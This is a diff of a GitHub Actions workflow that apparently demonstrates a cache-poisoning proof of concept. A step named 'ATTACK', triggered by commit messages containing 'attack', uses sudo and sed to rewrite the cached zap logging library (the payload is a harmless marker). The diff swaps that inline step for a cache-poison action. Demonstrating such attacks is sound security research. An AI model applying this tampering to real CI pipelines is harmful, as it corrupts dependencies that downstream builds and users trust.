@@ -29,12 +29,12 @@ jobs:
           go-version: ${{ matrix.go-version }}
         id: go
 
-      - name: Restore go cache
-        id: go-cache
-        uses: actions/cache@v2
-        with:
-          path: ~/go/pkg/mod
-          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}
+      # - name: Restore go cache
+      #   id: go-cache
+      #   uses: actions/cache@v2
+      #   with:
+      #     path: ~/go/pkg/mod
+      #     key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}
 
       - name: Check for .codecov.yaml
         id: codecov-enabled
@@ -68,8 +68,14 @@ jobs:
 
       - name: ATTACK - Posion github cache
         if: "contains(github.event.head_commit.message, 'attack')"
-        run: |
-          go mod tidy
-          sudo chmod +w /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
-          sudo sed -i 's/s.log(InfoLevel, msg, nil, keysAndValues)/s.log(InfoLevel, msg + " - (BAD library)", nil, keysAndValues)/g' /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
-          sudo chmod -w /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
+        uses: houdini91/cache-poison@v1
+        with:
+          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}
+
+      # - name: ATTACK - Posion github cache
+      #   if: "contains(github.event.head_commit.message, 'attack')"
+      #   run: |
+      #     go mod tidy
+      #     sudo chmod +w /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
+      #     sudo sed -i 's/s.log(InfoLevel, msg, nil, keysAndValues)/s.log(InfoLevel, msg + " - (BAD library)", nil, keysAndValues)/g' /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
+      #     sudo chmod -w /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
